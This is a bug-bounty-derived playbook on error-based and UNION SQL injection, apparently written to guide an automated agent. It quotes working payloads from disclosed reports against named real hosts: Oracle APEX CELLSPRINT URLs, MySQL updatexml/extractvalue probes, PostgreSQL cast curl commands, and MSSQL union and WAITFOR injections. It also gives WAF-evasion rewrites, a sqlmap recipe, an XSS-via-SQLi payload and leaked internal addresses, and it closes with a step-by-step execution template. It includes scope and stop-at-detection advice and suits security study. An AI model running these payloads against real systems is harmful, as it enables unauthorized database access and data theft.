---
title: "Error-Based & Union SQL Injection — when the database talks back in-band"
type: playbook
category: error-union-output
cwe: "CWE-89"
source_count: 20
full_bodies_available: 20
corpus: "HackerOne disclosed reports, 2014–2022 era, list seeded from github.com/shreyaschavhan/h1-reports-for-reference TOPSQLI.md, bodies fetched via hackerone.com/reports/<id>.json"
list_accessed: "2026-10-25"
note: "Every claim traces to bodies read in full this session; bounty figures are JSON amounts where present, otherwise as stated on the source list (marked). Severity/weakness labels are archive-era historical; bodies are the class authority."
---

# Error-Based & Union SQL Injection — when the database talks back in-band

## 1. Overview

Twenty confirmed full-body cases (2014–2022, widest DBMS spread of any
cluster: MySQL, MariaDB, MSSQL, Oracle, PostgreSQL). Here the injected expression
does not need a clock or a band pair — *the response itself carries the value*,
either because the application prints a database error into which the attacker
has folded a query result (**error-based**), or because the attacker extends the
query with a UNION whose second row is rendered (**union-based**).

The cluster's repertory has three distinct layers an agent must separate:

1. **Detection layer** — a quote or type mismatch produces an error that names
   the SQL dialect (`ORA-01756`, `ORA-01722`, `ORA-00933`, `SqlException`,
   `Microsoft SQL Server`).
2. **Value→error conversion layer** — server functions whose error text
   *contains the queried value*: MySQL `updatexml()` XPATH errors
   (SQL-277380, SQL-232378), MySQL `extractvalue()` (SQL-962889), PostgreSQL
   `cast(v as date)` comparisons (SQL-1489744), Oracle `OWA_UTIL.CELLSPRINT`
   render hooks (SQL-178632/178057).
3. **Second-row layer** — `UNION SELECT` merges an arbitrary row into the result
   rendering (MySQL/MariaDB cases in this corpus).

**Case-ID scheme: `SQL-<report id>`** (e.g. `SQL-178632`).

## 2. Detection layer — dialect announcement by error

The era's fastest fingerprint is a deliberate quote/type pair. SQL-519631 (DoD,
Oracle, `app_id` POST param) is the textbook pair:

> 4. Notice in the response, there is an error: `ORA-01756: quoted string not properly terminated`. This is because the single apostrophe (`'`) caused the SQL query to be syntactically invalid.
>
> 6. Notice in the response, there is an error: `ORA-01722: invalid number`. This is because the double apostrophes (`''`)  did not cause the SQL query to be syntactically invalid, but because aposrophes are not numbers, they caused a different error. (sic "aposrophes")
>
> 7. Repeat step #3 as many times as you like. An odd number of apostrophes (`'`) will cause the SQL query to fail because it is syntactically invalid, and an even number will cause it to fail because it is valid, but apostrophes are not numbers.

and the pre-condition that made the whole report possible:

> Note: I wouldn't have been able to find this vulnerability if it wasn't for the fact that verbose error pages were enabled. Because they were, it leaked source code, and I could see that the SQL injection vulnerability existed before testing.

Same host class, different dialect: SQL-447742 (DoD) —

> 3. The error "ORA-00933: SQL command not properly ended" is produced

— announced Oracle from a `" '; --  "` three-character probe, with the report
*stopping* at that discovery because the site had a WAF/IPS and the program's
tooling rules were unclear — an exit-discipline worth copying.

Source-code-echo detection: SQL-227102 (DoD `courses.aspx`, two error paths)
documents both the leak *and* its fix logic:

> The resulting errors reveal seven lines of C# code, including inline SQL which reveals internal database information.

> `Error converting data type varchar to numeric.` and indicates line 174 of `C:\Web_Data\iCatalog\onlinecatalog\courses.aspx`.

and the four-observable band summary that an agent can *test for on any .NET
target*:

> * `200/OK` and a proper page render when the parameter is set to a valid value.
> * TCP reset sent when the web application firewall (WAF) blocks a known-malicious value like `ORDER BY`.
> * Unhandled exceptions by the application code (as shown above).
> * Invalid input caught and appended to the `Invalid name parameter` message.

MSSQL stack-trace detection (SQL-381758, DoD messaging center search box):

> ' the site will return with  `Incorrect syntax` error that can confirm the site is effected with this bug .  (sic "effected")

> [SqlException (0x80131904): Unclosed quotation mark after the character string ' ORDER BY StartDate2 DESC'.
> Incorrect syntax near ' ORDER BY StartDate2 DESC'.]

— where the error text itself *names the rendered query context*
(`ORDER BY StartDate2 DESC`), a free query-shape disclosure that appears
*before* any payload is verified working:

> you can used this command `1'; waitfor delay '0:0:2' -- ` and the error page will return after `2` second

Cookie-carrier detection pair (SQL-761304, MTN):

> If you inject one quote mark like '. You get SQL error with the syntax. By injecting a second you have the error removed.
> I did not attempt to exfiltrate data as this is obvious indication of SQLi.

MySQL echoed through a ColdFusion corner: SQL-310031 (DoD, `tech.cfm`) gets the
*active query text echoed by the error page*:

> ```SELECT *, tbl_JobInfo.id as TJobID,tbl_JobDocs.id as DocID FROM dbo.tbl_JobInfo left outer join dbo.tbl_JobType on JobTypeID = tbl_JobType.id left outer join tbl_JobDocs on tbl_JobInfo.id = tbl_JobDocs.JobID WHERE JobTypeID = 3 AND JobTypeID > 1 AND Display = 'Y' Order by 'INJECTION' ASC1```  We can then demonstrate vulnerability by using time based queries and I opted to instead keep my queries low impact as to not violate the rules.

(the trailing `ASC1` artifact verbatim), then the time demonstration with its
*control*:
`?Sort=SLEEP(25)&ThisType=3` → *"This will cause the page hang to hang momentarily"* (sic) versus:

> This won't cause the website to hang, https://█████████/hro/html/tech.cfm?Sort=SLEEP()&ThisType=3

A dangling-parenthesis banner: SQL-390879 (DoD, `saveCount.cfm`) is the
sqlmap-banner cousin, quoted whole:

> Microsoft SQL Server 2008 R2 (SP3) - 10.50.6220.0 (X64& 
> 	Mar 19 2015 12:32:14 
> 	Copyright (c) Microsoft Corporation
> 	Standard Edition (64-bit) on Windows NT 6.3 <X64> (Build 9600: ) (Hypervisor)

(the trailing `&` kept as printed in source), followed by the exit line that an
agent should mirror — *"after confirming the vulnerability i have stopped testing
further."* — and the required impact shape: *"Attacker can take control over the
database server."*

## 3. Value→error conversion layer — "make the error quote the answer"

### 3.1 MySQL `updatexml` XPATH banner

Two DoD reports (2022 era, both by Corben Douglas [@sxcurity] per their own
signature lines) fold results into the XPATH error. SQL-277380 also opens with a
*fifth corpus regression* — the fix had been reverted:

> It looks like the patch for #231338 has been reverted and this subdomain is yet again vulnerable to SQL injection.

> `' and updatexml(null,concat(0x0a,version()),null)-- -@hackerone.mil` — *"You will see the MySQL version in the response"* (SQL-277380)

SQL-232378 pairs the conversion with a *time-based* PoC on the same parameter
(hybrid — cross-file to `Time-Based-Blind.md`):

> `█████=K*\' OR SLEEP(10) AND \'aSgl\'=\'aSgl` — *"3. Now the server will sleep for 10 seconds and then respond!"*

> `█████=K*\' OR updatexml(null,concat(0x3a3a,version()),null) AND \'aSgl\'=\'aSgl` — *"You will see: "<br><br>You have this list added to your current optionsXPATH syntax error: '::`████`'"* — *"which is the MySQL version!"*

with the ledger of extracted metadata —

> **information:**
> Current User: `███████@localhost`
> Databases: `█████`
> Version: `███`

— all from an error text fragment.

### 3.2 MySQL `extractvalue` variant

SQL-962889 (Acronis cloud-beta API, URL-parameter injection with
comment-guarded context-closure):

* URLs verbatim, as the body renders them:

> https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=1590228&unit=atp-agent%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2C%28select+database%28%29%29%29%29and%27

> https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?…same…extractvalue…%28select+user%28%29%29%29%29and%27

* Impact section text: *"sql injection"* — the body's only prose. The payload
  architecture, read from the URL itself: a handled parameter value
  (`unit=atp-agent`) is closed with `%27`, an `and/**/extractvalue(1,concat(char(126),(select+database())))`
  probe is inserted between comment slashes, and a trailing `and%27` re-balances
  the enclosing string — all inside one query-string parameter. Row bounty:
  $1,500 (list-stated; JSON shows none).

### 3.3 The PostgreSQL cast-to-timestamp echo — the blind→error pivot

SQL-1489744 (DoD, 2022) demonstrates *why* this cluster beats the blind family on
speed: the attacker *converts the queried value into a value-error*, and the
server prints it:

> POC 1 - curl command injecting query, returning database version:
> curl https://█████████ -X POST -data="url=%2F████████&███████=AA'+OR(cast(version as date))LIKE'A" -k

> POC 2 - curl command injecting query, returning current database:
> curl https://███████████████ -X POST -data="url=%2F██████████&███=AA'+OR(cast(current_user as date))LIKE'A" -k
> {"msg":"fail","err":"ERROR: invalid input syntax for type timestamp: \"████\""}

> POC 3 - curl command injecting query, returning current user:
> {"msg":"fail","err":"ERROR: invalid input syntax for type timestamp: \"███████\""}

and its remediation section names the class plainly:

> The vulnerable parameter "█████" in the ████████ endpoint should be sanitized properly. Usually this is done by implementing prepared statement.

The band channel (a JSON `{"msg":"fail",…}` rendering) is itself *readable
in-band* — no oracle pair needed. Copy this shape verbatim when a PostgreSQL
target parses `cast(<value> as date)` comparisons.

### 3.4 Oracle `OWA_UTIL.CELLSPRINT` — full-DB-print function on the APEX endpoint

Two Informatica reports (2017 era) record a *single* vector that renders whole
result sets without any schema knowledge:

SQL-178632:

> POC
> version
> http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+*+from+v$version

> hostname of the database server
> psvlxtdapp1.inf

> http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+SYS_CONTEXT('USERENV',+'HOST',+15)+ipaddr+from+dual

> IP address of the database server (local)
> 10.1.192.93

> http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+SYS_CONTEXT('USERENV',+'IP_ADDRESS',+15)+ipaddr+from+dual

> You need to patch all servers with the url /pls/apex/f? this is  old bug in oracle.  (sic)

SQL-178057 (companion host, same vector *):

> detection
> request 1
> http://ipm.informatica.com/pls/apex/f?1'=1  response 500 HTTP/1.1 500 Internal Server Error
> request 2
> http://ipm.informatica.com/pls/apex/f?1''=1 response HTTP/1.1 404 Not Found

> exploitation
> http://ipm.informatica.com/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+banner+FROM+v$version

> Cross Site Scripting via sql injection
> http://ipm.informatica.com/pls/apex/f?);HTP.PRINT(:1);--=positive<svg/onload=prompt('XSS through sql injection')>  (sic)

**Agent rule**: APEX-armed Oracle (`/pls/apex/f?`) converts *any* injected scalar
into a rendered table; it earns the corpus its largest error-class bounty-class
density ($0 bounty here but a *disclosed-era* pattern; cross-file to
`Library-and-Framework-SQLi.md` for the framework-risk treatment).

### 3.5 MSSQL type-cast via error band — fingerprint-first protocol

SQL-577612 (DoD) is the era's fingerprint-then-escalate protocol in one page:

> There is WAF, but we can make bypass and via global variable `@@LANGID` we can know that the base is used here - MSSQL

> https://█████/News/Transcripts/Search/Sort/?Customwho=31002/**/|/**/@@LANGID

> And if use a non-existing global variable, then we get an error. ██████

> https://██████████/News/Transcripts/Search/Sort/?Customwho=31002/**/|/**/@@nonexisting

The corpus keeps both the impact claim — *"We can read and do other manipulations
in the database. We can also try to make RCE"* — and the one-line remediation —
*"Using prepared statement"* — verbatim. The comment-slash rewrite (`/**/`) is
the filter adapter echoed by the same corpus in SQL-982202 and SQL-838855.

## 4. Second-row layer — UNION SELECT merge

SQL-1046084 (Automattic, intensedebate, $350 list bounty):

> 5. Now you have your site id,  go to the vulnerable URL with your site id `https://intensedebate.com/commenthistory/$YourSiteId`.
> 6. Now Trigger the SQL Injection with this following link `https://intensedebate.com/commenthistory/$YourSiteId%20union%20select%201,2,@@VERSION%23` (!) You need to do this with your own site id (!)
> 7. Now you can see `10.1.32-MariaDB` on the page.

and its ledger —

> ## POC
> @@VERSION
> current_user()

(attachments redacted in the archive; the *procedure shape* — **authorized-site
id required** — is what an agent copies). Its impact section claims, verbatim:
*"Full database access holding private user information and Reflected
Cross-Site-Scripting"* This report links sibling #1044698 (time-based, in
`Time-Based-Blind.md`) and #1042746 (time-based) — intensedebate host carries
both channels, and the report says so itself: *"Can you see my comment into
[#1044698](https://hackerone.com/reports/1044698) ??"*.

SQL-1125752 (TVA, /api/ path) fuses a union row with WAF-era syntax rewriting:

> `https://soa-accp.glbx.tva.gov/api/river/observed-data/GVDA1'+%2f*!50000union*%2f+SELECT+HOST_NAME()--+-` hostname dumped
> `https://soa-accp.glbx.tva.gov/api/river/observed-data/GVDA1'+%2f*!50000union*%2f+SELECT+@@version--+-`
> Microsoft SQL Server 2017 (RTM-CU22-GDR) (KB4583457) - 14.0.3370.1 (X64) 
> 	Nov  6 2020 18:19:52 
> 	Copyright (C) 2017 Microsoft Corporation
> 	Enterprise Edition (64-bit) on Windows Server 2012 R2 Standard 6.3 <X64> (Build 9600: ) (Hypervisor)

The payload rewrites the union token inside a MySQL-versioned comment —
`%2f*!50000union*%2f` (`/*!50000union*/`) — a classic WAF-era hint-block. The
report's own cross-check sentence (sic "bassed" kept):

> also you can retest it through time bassed trick

> ```time curl -k "https://soa-accp.glbx.tva.gov/api/river/observed-data/-GVDA1'+WAITFOR+DELAY+'0:0:10'--+-"```

An archival caution the body itself provides: the impact section claims — *"An
attacker can manipulate the SQL statements that are sent to the MySQL database
and inject malicious SQL statements."* — but the demonstrated server is MSSQL
(`@@version`, `WAITFOR`, `HOST_NAME()`). Labels drift inside bodies too; the
payload evidence is the class authority.

## 5. ColdFusion and ASP.NET detection edges

- SQL-310031 covers ColdFusion CFM error echoes; the *query-content echo* detail
  is §2's strongest rendering evidence.
- SQL-227102 covers .NET unhandled-exceptions as evidence *and* as
  remediation target — its third suggested action, verbatim:

> 1. Add code to return something other than the familiar `Invalid name parameter` error when the `crs_id` parameter is set to an invalid character. E.g., setting the value to `ä`:

with the report's own characterization of *why* this matters:

> Although seemingly a less sensitive error message, I found this behavior useful. It gave me a fourth option when distinguishing between various behaviors based on my fuzzing of the aforementioned parameter:

> 1. Add code to validate that the value of the `crs_id` parameter is an integer.
> 2. Add code to return a `404` error page if the value of the `crs_id` parameter does not reference a valid object. Alternatively, you could set a default value to that of a known-good object reference.

## 6. Detection value without exploitation

- SQL-923020 (Acronis `admin.acronis.host`, post-auth `search` parameter, $250
  JSON): the quote-trigger, verbatim — *"Next, I noticed the quote returned a
  server error in the API"* — confirmed SQLi via the request-file sqlmap recipe
  (`sqlmap.py -r {PATH TO FILE} --level 5 --risk 3 --random-agent --dbs`),
  which *"will drop the following three databases"*, then a table enumeration of
  `acronis_site` ([24 tables] in the body's own transcript). The scope sentence:
  *"I only explored nonsensitive information."* And the exit-discipline line —
  *"After seeing this, I ceased testing this SQL injection and reported the
  vulnerability directly to your team."* — plus the expected-triage honesty:
  *"I understand this domain is not rated critical, but I set it because of the
  severity of the bug."*
- SQL-360539 (Starbucks `char` formula injection, informative verdict):
  cross-ref §6 in `Boolean-and-Content-Oracle.md` — fingerprint by elimination,
  no exploitation.
- SQL-81701 (Gratipay, $1 list) — a single-character probe pair

  > The https://gratipay.com/on/twitter/'  (single-quote at the end) request returns 500 Error, but https://gratipay.com/on/twitter/" returns 404 so i believe it may be an injection.  (sic)

- SQL-310280 (MapsMarker, *informational*, list $10): the WP
  `wp_magic_quotes()` trap — the body's own framing of a *non-vulnerable but
  unhygienic* sink, quoted honestly:

  > At first, I thought, that my finding is a valid sql injection but I was wrong because of WordPress currently adding magic slashes to COOKIE/POST/GET - this is a very special behaviour which may be remove in the future.

  > As you can see $_GET['multi_layer_map_list']/$_POST['multi_layer_map_list'] are not escaped and exploded by "," in line 50.

  > This may result in a succesful sql injection on line 145 - depending on the use case of the shortcode:  (sic "succesful")

  > The only reason the application is not vulnerable is because of wp-settings.php:
  > ```
  > // Add magic quotes and set up $_REQUEST ( $_GET + $_POST )
  > wp_magic_quotes();
  > ```

  with the concrete fixes named in the body — *"Fix: esc_sql()"* on the
  shortcode line, *"Fix: intval()"* on the union-building loop — and the
  residual-risk warning: *"a lot of themes and/or plugins … reset this
  setting"*. The "are not escaped" line describes a *raw*, unescaped sink
  upstream of WordPress' magic-quotes slashing — the corpus's clearest argument
  that *detection of a raw sink is not detection of an exploitable sink*, also
  mirrored in `Library-and-Framework-SQLi.md` §5.

## 7. Agent execution template

1. **Enumerate the error surface first** on .NET/Oracle stacks (verbose error
   pages, stack traces) — SQL-519631's rule: configuration that shows unhandled
   exceptions is itself the *precondition* the cluster's detection layer runs
   against.
2. **Dialect-announce probes** (§2): `'` vs `''`; `@@LANGID`-style
   `<literal>|<global>` probes for MSSQL (§3.5); `1'=1` vs `1''=1` for
   APEX-Oracle (§3.4). Record every error text verbatim — the error *names the
   dialect and often the query context*.
3. **Value→error conversion** per DBMS (§3): MySQL `updatexml()` /
   `extractvalue()` XPATH banners; PostgreSQL `cast(v as date)` echo; Oracle
   `OWA_UTIL.CELLSPRINT(:1)` render; MSSQL stack-trace + `WAITFOR` combo from
   SQL-381758.
4. **Union row only after a column-count is known**: `union select 1,2,@@VERSION#`
   (SQL-1046084's exact shape, with the own-site-id guard).
5. **WAF-era rewrites confirmed in the corpus**: `/**/` inner-comments
   (SQL-577612, SQL-982202, SQL-838855), `/*!50000union*/` MySQL hints
   (SQL-1125752), `-- @hackerone.mil` suffixes that satisfy context-closure
   (SQL-277380).
6. **Exit/ledger discipline**: SQL-447742's *stop-at-detection* report and
   SQL-923020's *"I only explored nonsensitive information."* are the
   guardrail verbs for all error-based in-band claims.

## 8. Validation gates

1. **Error text quoted verbatim** in any claim — including markup noise — the
   corpus's versions themselves were recorded with trailing artifacts and are
   the *provenance* of the value (§2, §3 quotes all keep artifacts; the agent
   does the same).
2. **A *value* was shown ≥ once** — detection-only reports are filed as
   fingerprinting, not as exploitations (SQL-447742, SQL-360539 verdicts kept
   honest).
3. **Extracted metadata ≤ the ledger the scope permits** — SQL-923020's proof
   *surface* (three DB names, table names) is the standard; versions/banners
   outnumber credentials.
4. **Auto-tool transcripts admitted as evidence only with the target's errors
   reproduced independently** (SQL-277380 & SQL-232378 both show *manual*
   payloads alongside sqlmap-era claims).
5. **The sink's context (where in the query the injection sits) is stated** —
   e.g. SQL-761304's *cookie parameter* path; SQL-1489744's *POST parameter*
   path. An error-is-injected claim without sink-context cannot survive triage.

## 9. Archive-era label honesty

- SQL-447742 filed under *"SQL Injection"* while *stopping* at detection —
  fair; the substate was resolved either way, no impact claim made. The agent
  should report exactly what the extraction surface is, not more.
- SQL-310031's own body line *"I opted to instead keep my queries low impact as to not violate the rules."* — the era's exit-when-authorized-only discipline, quoted here as primary evidence text.
- SQL-81701 (Gratipay, $1) never had a showable *value* — kept in the corpus as
  the *minimal pair* evidence; the bounty is one dollar and its honesty is the
  point.
- Cross-file: SQL-197755 (US Navy sqlmap runs with `--tamper=between,bluecoat`)
  moved in `Time-Based-Blind.md` §9 as its DBMS-guess caveat governs.

**Cross-references**: time channel `Time-Based-Blind.md`; band pairs
`Boolean-and-Content-Oracle.md`; OOB channel `Out-of-Band-Callback.md`; the
framework-level `Library-and-Framework-SQLi.md`; escalation end-game
`SQLi-to-RCE-Chains.md`.
